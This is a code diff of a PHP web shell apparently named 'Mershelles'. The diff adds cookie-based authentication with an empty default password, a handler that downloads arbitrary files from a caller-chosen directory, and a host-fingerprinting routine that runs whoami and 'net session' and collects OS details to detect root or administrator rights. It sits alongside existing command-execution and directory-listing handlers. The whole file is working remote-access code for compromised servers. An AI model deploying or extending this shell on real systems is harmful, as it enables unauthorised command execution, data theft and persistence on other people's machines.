@@ -1,12 +1,15 @@
 <?php
 
+#region password
 $password = "@@PASSWORD@@";
-$password = "test"; // todo remove
+$password = ""; // todo remove
 if ($password === "@@PASS" . "WORD@@") {
     $password = "";
 }
 define("PASSWORD", $password);
+#endregion
 
+#region responses
 function respond($code, $data)
 {
     $data = array_merge(array("cwd" => getcwd()), $data);
@@ -27,7 +30,71 @@ function success($data)
 {
     respond(200, array_merge(array("success" => true), $data));
 }
+#endregion
 
+function checkAuth()
+{
+    if (PASSWORD === "") {
+        return; // no auth needed
+    }
+
+    if ($_POST["password"] !== PASSWORD) {
+        respond(401, array("error" => "Invalid password"));
+    }
+}
+
+function handleAuth()
+{
+    if ($_POST["password"] === PASSWORD) {
+        setcookie("mershelles", md5(PASSWORD), time() + (86400 * 30));
+        success(array());
+    } else {
+        error("Invalid password!");
+    }
+}
+
+# check authentication
+if (PASSWORD !== "" && $_COOKIE["mershelles"] !== md5(PASSWORD)) {
+
+    # if is auth request, check password
+    if ($_SERVER["REQUEST_METHOD"] === "POST" && $_POST["type"] === "auth") {
+        handleAuth();
+    }
+
+    respond(401, array("error" => "unauthorized"));
+}
+
+// file download
+if ($_SERVER["REQUEST_METHOD"] === "GET") {
+    if (isset($_GET["download"])) {
+
+        chdir($_GET["cwd"]);
+
+        // handle download call
+        function handle_download($file)
+        {
+            if (!file_exists($file)) {
+                die('File not found');
+            }
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($file));
+            flush();
+            readfile($file);
+            flush();
+            exit;
+        }
+
+        handle_download($_GET["download"]);
+        exit(0);
+    }
+}
+
+#region api calls
 
 function exec_cmd($cmd)
 {
@@ -78,13 +145,49 @@ function handleExec()
 
 function handleInit()
 {
-    respond(200, array(
-        "version" => "1.0.0",
-        "name" => "PHP",
-        "description" => "PHP host for Mershelles",
-        "author" => "Mershelles",
-        "author_url" => ""
-    ));
+
+    function windows_summary()
+    {
+        $is_admin_check = "net session 1>NUL 2>NUL || echo false";
+        $is_admin_res = exec_cmd($is_admin_check);
+
+        return array(
+            "username" => exec_cmd("whoami"),
+            "isSuperUser" => $is_admin_res[0] !== "false"
+        );
+    }
+
+    function linux_summary()
+    {
+        $is_root_res = exec_cmd("whoami");
+        return array(
+            "username" => $is_root_res,
+            "isSuperUser" => $is_root_res[0] === "root"
+        );
+    }
+
+    function is_windows()
+    {
+        return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+    }
+
+    $res = array(
+        "os" => php_uname("s"),
+        "hostname" => php_uname("n"),
+        "release" => php_uname("r"),
+        "version" => php_uname("v"),
+        "machine" => php_uname("m"),
+        "all" => php_uname("a"),
+        "writeable" => is_writeable(getcwd())
+    );
+
+    if (is_windows()) {
+        $res = array_merge($res, windows_summary());
+    } else {
+        $res = array_merge($res, linux_summary());
+    }
+
+    success($res);
 }
 
 function handleLs()
@@ -115,35 +218,9 @@ function handleLs()
     success(array("files" => $files));
 }
 
-function checkAuth()
-{
-    if (PASSWORD === "") {
-        return; // no auth needed
-    }
-
-    if ($_POST["password"] !== PASSWORD) {
-        respond(401, array("error" => "Invalid password"));
-    }
-}
-
-function handleAuth()
-{
-    if ($_POST["password"] === PASSWORD) {
-        success(array());
-    } else {
-        error("Invalid password!");
-    }
-}
-
-
 // handle api calls
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $type = $_POST["type"];
-
-    // check password
-    if ($type !== "auth") {
-        checkAuth();
-    }
 
     if (isset($_POST["cwd"]) && is_dir($_POST["cwd"])) {
         chdir($_POST["cwd"]);
@@ -151,9 +228,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
 
     switch ($type) {
-        case "auth":
-            handleAuth();
-            break;
         case "init":
             handleInit();
             break;
@@ -167,3 +241,5 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             break;
     }
 }
+
+#endregion
